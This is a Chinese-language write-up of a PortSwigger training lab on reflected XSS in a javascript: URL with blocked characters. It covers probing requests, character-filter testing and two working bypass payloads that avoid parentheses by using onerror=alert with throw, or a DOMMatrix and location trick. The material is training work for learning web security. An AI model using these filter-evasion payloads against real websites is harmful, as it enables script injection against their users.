# 实验：部分字符被阻止的 JavaScript URL 中的反射型 XSS

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked

[关联文章](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)


本实验将你的输入回显在一个 JavaScript URL 中，但一切并非表面看起来那样简单。这起初似乎是一个微不足道的挑战；然而，应用程序阻止了某些字符以试图防止 XSS 攻击。

为了解决本实验，请执行一个跨站脚本攻击，调用 `alert` 函数，且 `alert` 消息中包含字符串 `1337`。

## 步骤

探测
- 浏览文章页面并添加测试参数
    ```http
    GET /post?postId=4&h1pva7vk HTTP/2
    ```

    - 响应
        ```html
        <div class="is-linkback">
            <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4%26h1pva7vk'}).finally(_ => window.location = '/')">Back to Blog</a>
        </div>
        ```
        - 返回链接为 JS 伪协议
            - 端点 `/analytics`
                - post 内容 `'/post?postId=4&h1pva7vk'`
            - 最后回到根目录
        - 上下文 `a` 标签内 `href` 属性中的 JS 伪协议字符串

测试
- 测试特殊字符 `%&;/\()<>'"{},[].`
    ```http
    GET /post?postId=4&%25%26%3b%2f%5c%28%29%3c%3e%27%22%7b%7d%2c%5b%5d%2e HTTP/2
    ```

    - 响应 `%26%3b/%3c%3e%27"{},.`
        - `&;/<>'"{},.`
        - 双引号无处理而逃逸出字符串

    - 无法进行 Unicode 编码 `\`，被删除
    - 无法进行 HTML 编码 `&;`，被 URL 编码
    - 无法使用圆括号 `()` 被删除

攻击，在 JS 伪协议内执行，从字典逃逸后作为 `fetch` 的冗余参数
- 直接调用 `throw` 无法执行 
    ```js
    '},{a:onerror=alert,b:throw'1337
    ```
        
    - 控制台异常
        `fetch('/analytics', {method:'post',body:'/post?postId=4&foooooooooo'},{a:onerror=alert,b:throw'1337'}).finally(_ => window.location = '/')`

        `Uncaught SyntaxError: Unexpected token 'throw'`

        - `throw` 作为语句无法用在表达式位置（仅在开头位置可用）

- 保存 `throw` 到命名函数，使用命名函数覆盖对象函数字段，执行函数操作后触发 `throw`

    ```js
    '},xfunc=_=>{throw/**/onerror=alert,1337},toString=xfunc,window+'',{foo:'
    ```
    - `xfunc=_=>{throw/**/onerror=alert,1337}`
        构造自定义无参数命名函数
        - 使用注释 `/**/` 作为分隔
        - 设置事件处理器 `onerror=alert`
        - 传参并抛出异常 `throw 1337` 

    - `toString=xfunc`
        覆盖 `window` 对象的 `toString` 方法为之前的自定义函数
    - `window+''`
        `window` 对象进行字符串操作，触发 `toString` 方法，调用自定义函数

    变体
    ```js
    '},xfunc=_=>{x=new/**/DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x},toString=xfunc,window+'',{foo:'   
    ```
    - `xfunc=_=>{x=new/**/DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x}`
        - `x=new/**/DOMMatrix;`
            新建矩阵对象 `DOMMatrix` 
            - 新矩阵对象进行字符串操作时调用
                `matrix(1, 0, 0, 1, 0, 0)`
        - `matrix=alert`
            设置 `DOMMatrix` 原型对象的字符操作属性 `matrix` 为 `alert`，之后字符串操作触发调用
        - `x.a=1337` 
            设置矩阵对象的第一个坐标为 `1337`，之后作为参数1
        - `location='javascript'+':'+x`
            设置当前 URL 为 JS 伪协议
            - 触发矩阵对象字符串操作，设置 `matrix(1337,...)` 函数字符串
            - `location` 最终触发 JS 伪协议执行
                - 最终为 `alert(1337, 0, 0, 1, 0, 0)`
                - `alert` 取第一个参数，并忽略冗余参数
